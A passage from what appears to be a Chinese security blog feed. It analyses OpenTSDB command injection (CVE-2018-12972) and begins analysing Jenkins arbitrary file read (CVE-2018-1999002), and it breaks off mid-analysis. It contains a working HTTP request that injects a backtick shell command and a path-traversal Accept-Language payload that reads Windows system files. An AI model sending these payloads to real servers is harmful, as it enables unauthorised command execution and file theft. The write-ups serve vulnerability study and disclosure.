HashSet&lt;String&gt;[] aggregated_tags,</div><div class="line">                     <span class="keyword">final</span> <span class="keyword">int</span> npoints) &#123;</div><div class="line">     ... </div><div class="line">     <span class="keyword">this</span>.plot = plot;</div><div class="line"></div><div class="line">     <span class="keyword">if</span> (IS_WINDOWS)</div><div class="line">       <span class="keyword">this</span>.basepath = basepath.replace(<span class="string">"\\"</span>, <span class="string">"\\\\"</span>).replace(<span class="string">"/"</span>, <span class="string">"\\\\"</span>);</div><div class="line">     <span class="keyword">else</span></div><div class="line">       <span class="keyword">this</span>.basepath = basepath;</div><div class="line">     ...</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
<p>在<code>doGraph</code>的最后执行了<code>execGnuplot(rungnuplot, query);</code>，即src/tsd/GraphHandler.java:256<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">execGnuplot</span><span class="params">(RunGnuplot rungnuplot, HttpQuery query)</span> </span>&#123;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    gnuplot.execute(rungnuplot);</div><div class="line">  &#125; <span class="keyword">catch</span> (RejectedExecutionException e) &#123;</div><div class="line">    query.internalError(<span class="keyword">new</span> Exception(<span class="string">"Too many requests pending,"</span></div><div class="line">                                      + <span class="string">" please try again later"</span>, e));</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这边<code>RunGnuplot</code>实现了<code>Runnable</code>接口，因此当线程开始执行时调用的是<code>RunGnuplot</code>的<code>run</code>方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">RunGnuplot</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</div><div class="line">  ...</div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      execute();</div><div class="line">    &#125; <span class="keyword">catch</span> (BadRequestException e) &#123;</div><div class="line">      query.badRequest(e.getMessage());</div><div class="line">    &#125; <span class="keyword">catch</span> (GnuplotException e) &#123;</div><div class="line">      query.badRequest(<span class="string">"&lt;pre&gt;"</span> + e.getMessage() + <span class="string">"&lt;/pre&gt;"</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</div><div class="line">      query.internalError(e);</div><div class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">      query.internalError(e);</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>execute()</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">    <span class="keyword">final</span> <span class="keyword">int</span> nplotted = runGnuplot(query, basepath, plot);</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>runGnuplot</code>，位置在src/tsd/GraphHandler.java:758<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">runGnuplot</span><span class="params">(<span class="keyword">final</span> HttpQuery query,</span></span></div><div class="line">                       <span class="keyword">final</span> String basepath,</div><div class="line">                       <span class="keyword">final</span> Plot plot) <span class="keyword">throws</span> IOException &#123;</div><div class="line">   <span class="keyword">final</span> <span class="keyword">int</span> nplotted = plot.dumpToFiles(basepath);</div><div class="line">   </div><div class="line">   ...</div><div class="line"></div><div class="line">   <span class="keyword">final</span> Process gnuplot = <span class="keyword">new</span> ProcessBuilder(GNUPLOT,</div><div class="line">     basepath + <span class="string">".out"</span>, basepath + <span class="string">".err"</span>, basepath + <span class="string">".gnuplot"</span>).start();</div><div class="line">   ...</div><div class="line"></div><div class="line">   <span class="keyword">return</span> nplotted;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p><code>dumpToFiles</code>方法定义在<code>src/graph/Plot.java:196</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">dumpToFiles</span><span class="params">(<span class="keyword">final</span> String basepath)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">  <span class="keyword">int</span> npoints = <span class="number">0</span>;</div><div class="line">  <span class="keyword">final</span> <span class="keyword">int</span> nseries = datapoints.size();</div><div class="line">  <span class="keyword">final</span> String datafiles[] = nseries &gt; <span class="number">0</span> ? <span class="keyword">new</span> String[nseries] : <span class="keyword">null</span>;</div><div class="line">  FileSystem.checkDirectory(<span class="keyword">new</span> File(basepath).getParent(),</div><div class="line">      Const.MUST_BE_WRITEABLE, Const.CREATE_IF_NEEDED);</div><div class="line"> </div><div class="line">  ... <span class="comment">// 省略一些初始化的文件写入操作</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> (npoints == <span class="number">0</span>) &#123;</div><div class="line">    <span class="comment">// 之前提到的 yrange 是通过put("yrange", value)获得</span></div><div class="line">    <span class="comment">// 但在这里由于某些条件(npoints == 0)会直接被硬编码为 [0:10]</span></div><div class="line">    params.put(<span class="string">"yrange"</span>, <span class="string">"[0:10]"</span>);  <span class="comment">// Doesn't matter what values we use.</span></div><div class="line">  &#125;</div><div class="line">  writeGnuplotScript(basepath, datafiles);</div><div class="line">  <span class="keyword">return</span> npoints;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>writeGnuplotScript(basepath, datafiles)</code>，这个方法会生成真正的Gnuplot脚本，方便起见我往里面加了注释<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Generates the Gnuplot script.</div><div class="line"> * <span class="doctag">@param</span> basepath The base path to use.</div><div class="line"> * <span class="doctag">@param</span> datafiles The names of the data files that need to be plotted,</div><div class="line"> * in the order in which they ought to be plotted.  It is assumed that</div><div class="line"> * the ith file will correspond to the ith entry in &#123;<span class="doctag">@code</span> datapoints&#125;.</div><div class="line"> * Can be &#123;<span class="doctag">@code</span> null&#125; if there's no data to plot.</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeGnuplotScript</span><span class="params">(<span class="keyword">final</span> String basepath,</span></span></div><div class="line">                                <span class="keyword">final</span> String[] datafiles) <span class="keyword">throws</span> IOException &#123;</div><div class="line">  <span class="keyword">final</span> String script_path = basepath + <span class="string">".gnuplot"</span>;</div><div class="line"></div><div class="line">  <span class="comment">// gp即要生成的Gnuplot脚本</span></div><div class="line">  <span class="keyword">final</span> PrintWriter gp = <span class="keyword">new</span> PrintWriter(script_path);</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    <span class="comment">// XXX don't hardcode all those settings.  At least not like that.</span></div><div class="line">    gp.append(<span class="string">"set term png small size "</span>)</div><div class="line">      <span class="comment">// Why the fuck didn't they also add methods for numbers?</span></div><div class="line">      .append(Short.toString(width)).append(<span class="string">","</span>)</div><div class="line">      .append(Short.toString(height));</div><div class="line">    </div><div class="line">    <span class="comment">// 获取了 smooth，fgcolor，style，bgcolor这四个参数</span></div><div class="line">    <span class="keyword">final</span> String smooth = params.remove(<span class="string">"smooth"</span>);</div><div class="line">    <span class="keyword">final</span> String fgcolor = params.remove(<span class="string">"fgcolor"</span>);</div><div class="line">    <span class="keyword">final</span> String style = params.remove(<span class="string">"style"</span>);</div><div class="line">    String bgcolor = params.remove(<span class="string">"bgcolor"</span>);</div><div class="line">    </div><div class="line">    <span class="comment">// 一些边界情况</span></div><div class="line">    <span class="keyword">if</span> (fgcolor != <span class="keyword">null</span> &amp;&amp; bgcolor == <span class="keyword">null</span>) &#123;</div><div class="line">      bgcolor = <span class="string">"xFFFFFF"</span>;  <span class="comment">// So use a default.</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (bgcolor != <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (fgcolor != <span class="keyword">null</span> &amp;&amp; <span class="string">"transparent"</span>.equals(bgcolor)) &#123;</div><div class="line">        bgcolor = <span class="string">"transparent xFFFFFF"</span>;</div><div class="line">      &#125;</div><div class="line">      <span class="comment">//  往Gnuplot脚本中写入参数bgcolor</span></div><div class="line">      gp.append(<span class="string">' '</span>).append(bgcolor);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (fgcolor != <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="comment">//  往Gnuplot脚本中写入参数fgcolor</span></div><div class="line">      gp.append(<span class="string">' '</span>).append(fgcolor);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    gp.append(<span class="string">"\n"</span></div><div class="line">              + <span class="string">"set xdata time\n"</span></div><div class="line">              + <span class="string">"set timefmt \"%s\"\n"</span></div><div class="line">              + <span class="string">"if (GPVAL_VERSION &lt; 4.6) set xtics rotate; else set xtics rotate right\n"</span></div><div class="line">              + <span class="string">"set output \""</span>).append(basepath + <span class="string">".png"</span>).append(<span class="string">"\"\n"</span></div><div class="line">              + <span class="string">"set xrange [\""</span>)</div><div class="line">      .append(String.valueOf((start_time &amp; UNSIGNED) + utc_offset))</div><div class="line">      .append(<span class="string">"\":\""</span>)</div><div class="line">      .append(String.valueOf((end_time &amp; UNSIGNED) + utc_offset))</div><div class="line">      .append(<span class="string">"\"]\n"</span>);</div><div class="line">    <span class="comment">//  往Gnuplot脚本中写入参数format x 会被双引号包裹</span></div><div class="line">    <span class="keyword">if</span> (!params.containsKey(<span class="string">"format x"</span>)) &#123;</div><div class="line">      gp.append(<span class="string">"set format x \""</span>).append(xFormat()).append(<span class="string">"\"\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ....</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (params != <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">for</span> (<span class="keyword">final</span> Map.Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</div><div class="line">        <span class="comment">// 对params中剩下的参数，key即名字，value即对应的值</span></div><div class="line">        <span class="keyword">final</span> String key = entry.getKey();</div><div class="line">        <span class="keyword">final</span> String value = entry.getValue();</div><div class="line">        <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</div><div class="line">          <span class="comment">// 往Gnuplot脚本中写入对应参数</span></div><div class="line">          gp.append(<span class="string">"set "</span>).append(key)</div><div class="line">            .append(<span class="string">' '</span>).append(value).write(<span class="string">'\n'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">          gp.append(<span class="string">"unset "</span>).append(key).write(<span class="string">'\n'</span>);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    gp.write(<span class="string">"plot "</span>);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nseries; i++) &#123;</div><div class="line">      ...</div><div class="line">      </div><div class="line">      <span class="keyword">if</span> (smooth != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="comment">// 往Gnuplot脚本中写入对应 smooth 参数</span></div><div class="line">        gp.append(<span class="string">" smooth "</span>).append(smooth);</div><div class="line">      &#125;</div><div class="line">      <span class="comment">// TODO(tsuna): Escape double quotes in title.</span></div><div class="line">      <span class="comment">// 往Gnuplot脚本中写入对应 title 参数，但是被双引号包裹了</span></div><div class="line">      gp.append(<span class="string">" title \""</span>).append(title).write(<span class="string">'"'</span>);</div><div class="line">      ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在完成了<code>plot.dumpToFiles(basepath);</code>后，开启子进程运行生成的Gnuplot脚本：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">final</span> Process gnuplot = <span class="keyword">new</span> ProcessBuilder(GNUPLOT,</div><div class="line">      basepath + <span class="string">".out"</span>, basepath + <span class="string">".err"</span>, basepath + <span class="string">".gnuplot"</span>).start();</div></pre></td></tr></table></figure></p>
<p>而gnuplot中允许使用反引号来执行sh命令，</p>
<p>交互模式下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731225945-5c96fb9c-94d2-1.png" alt="1.jpg"></p>
<p>脚本执行模式下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731225945-5cb0f308-94d2-1.png" alt="2.jpg"></p>
<p>因此我们可以通过远程控制特定的参数，使得Gnuplot在运行脚本时远程命令执行。支持远程命令执行的可控参数如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">http请求参数</th>
<th style="text-align:center">Java代码</th>
<th style="text-align:center">plot参数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">y2range</td>
<td style="text-align:center">put(“y2range”, value)</td>
<td style="text-align:center">y2range</td>
</tr>
<tr>
<td style="text-align:center">key</td>
<td style="text-align:center">put(“key”, value)</td>
<td style="text-align:center">key</td>
</tr>
<tr>
<td style="text-align:center">bgcolor</td>
<td style="text-align:center">put(“bgcolor”, value)</td>
<td style="text-align:center">bgcolor</td>
</tr>
<tr>
<td style="text-align:center">fgcolor</td>
<td style="text-align:center">put(“fgcolor”, value)</td>
<td style="text-align:center">fgcolor</td>
</tr>
<tr>
<td style="text-align:center">smooth</td>
<td style="text-align:center">put(“smooth”, value)</td>
<td style="text-align:center">smooth</td>
</tr>
<tr>
<td style="text-align:center">style</td>
<td style="text-align:center">put(“style”, value)</td>
<td style="text-align:center">style</td>
</tr>
<tr>
<td style="text-align:center">o</td>
<td style="text-align:center">省略</td>
<td style="text-align:center">省略</td>
</tr>
</tbody>
</table>
</div>
<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><p>先查出可以使用的metrics<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /suggest?type=metrics&amp;q= HTTP/1.1</div></pre></td></tr></table></figure></p>
<p>发包，在参数位置处填入payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /q?start=2018/07/05-00:00:00&amp;end=2018/07/30-00:00:00&amp;m=sum:rate:env.air&amp;o=%6ls%60&amp;yrange=%5B0:%5D&amp;wxh=1900x738&amp;style=linespoint&amp;json HTTP/1.1</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731225945-5ccc0a58-94d2-1.png" alt="4.jpg"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731225945-5ce72842-94d2-1.png" alt="5.jpg"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http" target="_blank" rel="external">https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2511&quot;&gt;OpenTSDB远程命令执行漏洞分析 -【CVE-2018-12972】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="opentsdb" scheme="http://chybeta.github.io/tags/opentsdb/"/>
    
      <category term="远程命令执行" scheme="http://chybeta.github.io/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="RCE" scheme="http://chybeta.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins 任意文件读取漏洞复现与分析 - 【CVE-2018-1999002】</title>
    <link href="http://chybeta.github.io/2018/08/07/Jenkins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1999002%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/08/07/Jenkins-任意文件读取漏洞复现与分析-【CVE-2018-1999002】/</id>
    <published>2018-08-07T14:25:11.000Z</published>
    <updated>2018-08-07T14:26:29.478Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2486" target="_blank" rel="external">Jenkins 任意文件读取漏洞复现与分析 - 【CVE-2018-1999002】</a><br><a id="more"></a></p>
<h1 id="SECURITY-914-CVE-2018-1999002"><a href="#SECURITY-914-CVE-2018-1999002" class="headerlink" title="SECURITY-914 / CVE-2018-1999002"></a>SECURITY-914 / CVE-2018-1999002</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">An arbitrary file read vulnerability in the Stapler web framework used by Jenkins allowed unauthenticated users to send crafted HTTP requests returning the contents of any file on the Jenkins master file system that the Jenkins master process has access to.</div><div class="line"></div><div class="line">Input validation in Stapler has been improved to prevent this.</div></pre></td></tr></table></figure>
<p>漏洞影响版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Jenkins weekly up to and including 2.132</div><div class="line">Jenkins LTS up to and including 2.121.1</div></pre></td></tr></table></figure></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>测试环境： win平台</p>
<p>通过查找<a href="https://github.com/jenkinsci/jenkins/commit/29ca81dd59c255ad633f1bd86cf1be40a5f02c64" target="_blank" rel="external">commit记录</a>可知需要将其检出至 29ca81dd59c255ad633f1bd86cf1be40a5f02c64之前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; git clone https://github.com/jenkinsci/jenkins.git</div><div class="line">&gt; git checkout 40250f08aca7f3f8816f21870ee23463a52ef2f2</div></pre></td></tr></table></figure></p>
<p>检查<code>core/pom.xml</code>的第41行，确保版本为<code>1.250</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">staplerFork</span>&gt;</span>true<span class="tag">&lt;/<span class="name">staplerFork</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">stapler.version</span>&gt;</span>1.250<span class="tag">&lt;/<span class="name">stapler.version</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>然后命令行下编译war包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mvn clean install -pl war -am -DskipTests</div></pre></td></tr></table></figure></p>
<p>在<code>jenkins\war\target</code>目录下获得编译好的<code>jenkins.war</code>，同目录下启动：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar jenkins.war</div></pre></td></tr></table></figure></p>
<p>在管理员登陆（有cookie）的情况下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180726004508-16df43d6-902a-1.png" alt="winini.jpg"></p>
<p>在没有登陆（未授权，cookie清空）的情况下，只有当管理员开启了<code>allow anonymous read access</code>的时候，才能实现任意文件读取，否则仍需登陆。</p>
<p>开启：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180726004508-17004bda-902a-1.png" alt="allow.jpg"></p>
<p>未开启：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180726004508-172abca8-902a-1.png" alt="noallow.jpg"></p>
<p>而在linux下利用条件会更加苛刻，见后文。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>以payload为例，请求的url为<code>/plugin/credentials/.ini</code>。而在<code>hudson/Plugin.java:227</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">    * This method serves static resources in the plugin under &lt;tt&gt;hudson/plugin/SHORTNAME&lt;/tt&gt;.</div><div class="line">**/</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doDynamic</span><span class="params">(StaplerRequest req, StaplerResponse rsp)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</div><div class="line">    String path = req.getRestOfPath();</div><div class="line"></div><div class="line">    String pathUC = path.toUpperCase(Locale.ENGLISH);</div><div class="line">    <span class="keyword">if</span> (path.isEmpty() || path.contains(<span class="string">".."</span>) || path.startsWith(<span class="string">"."</span>) || path.contains(<span class="string">"%"</span>) || pathUC.contains(<span class="string">"META-INF"</span>) || pathUC.contains(<span class="string">"WEB-INF"</span>)) &#123;</div><div class="line">        LOGGER.warning(<span class="string">"rejecting possibly malicious "</span> + req.getRequestURIWithQueryString());</div><div class="line">        rsp.sendError(HttpServletResponse.SC_BAD_REQUEST);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// Stapler routes requests like the "/static/.../foo/bar/zot" to be treated like "/foo/bar/zot"</span></div><div class="line">    <span class="comment">// and this is used to serve long expiration header, by using Jenkins.VERSION_HASH as "..."</span></div><div class="line">    <span class="comment">// to create unique URLs. Recognize that and set a long expiration header.</span></div><div class="line">    String requestPath = req.getRequestURI().substring(req.getContextPath().length());</div><div class="line">    <span class="keyword">boolean</span> staticLink = requestPath.startsWith(<span class="string">"/static/"</span>);</div><div class="line"></div><div class="line">    <span class="keyword">long</span> expires = staticLink ? TimeUnit2.DAYS.toMillis(<span class="number">365</span>) : -<span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="comment">// use serveLocalizedFile to support automatic locale selection</span></div><div class="line">    rsp.serveLocalizedFile(req, <span class="keyword">new</span> URL(wrapper.baseResourceURL, <span class="string">'.'</span> + path), expires);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>doDynamic</code>函数用于处理类似<code>/plugin/xx</code>的请求，<code>serveLocalizedFile</code>在<code>stapler-1.250-sources.jar!/org/kohsuke/stapler/ResponseImpl.java</code>第209行左右：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">serveLocalizedFile</span><span class="params">(StaplerRequest request, URL res, <span class="keyword">long</span> expiration)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</div><div class="line">    <span class="keyword">if</span>(!stapler.serveStaticResource(request, <span class="keyword">this</span>, stapler.selectResourceByLocale(res,request.getLocale()), expiration))</div><div class="line">        sendError(SC_NOT_FOUND);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>先看最里面的<code>request.getLocale()</code>，然后再来分析<code>stapler.selectResourceByLocale()</code>。</p>
<p>跟入<code>request.getLocale()</code>，至<code>jetty-server-9.2.15.v20160210-sources.jar!/org/eclipse/jetty/server/Request.java:692</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> Locale <span class="title">getLocale</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        String language = (String)acceptLanguage.get(<span class="number">0</span>);</div><div class="line">        language = HttpFields.valueParameters(language,<span class="keyword">null</span>);</div><div class="line">        String country = <span class="string">""</span>;</div><div class="line">        <span class="keyword">int</span> dash = language.indexOf(<span class="string">'-'</span>);</div><div class="line">        <span class="keyword">if</span> (dash &gt; -<span class="number">1</span>)</div><div class="line">        &#123;</div><div class="line">            country = language.substring(dash + <span class="number">1</span>).trim();</div><div class="line">            language = language.substring(<span class="number">0</span>,dash).trim();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Locale(language,country);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> Locale.getDefault();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里用于处理HTTP请求中的<code>Accept-Language</code>头部。比如<code>zh-cn</code>，则会根据<code>-</code>的位置被分为两部分，<code>language</code>为<code>zh</code>，<code>country</code>为<code>cn</code>，然后返回<code>Locale(language,country)</code>对象。倘若不存在<code>-</code>，则<code>country</code>为空，<code>language</code>即对应我们的payload:<code>../../../../../../../../../../../../windows/win</code>，则此时返回一个<code>Locale(language,&quot;&quot;)</code></p>
<p>返回后即进入<code>selectResourceByLocale(URL url, Locale locale)</code>,这里的<code>locale</code>参数即上一步返回的locale对象。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function">OpenConnection <span class="title">selectResourceByLocale</span><span class="params">(URL url, Locale locale)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">    <span class="comment">// hopefully HotSpot would be able to inline all the virtual calls in here</span></div><div class="line">    <span class="keyword">return</span> urlLocaleSelector.open(url.toString(),locale,url);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
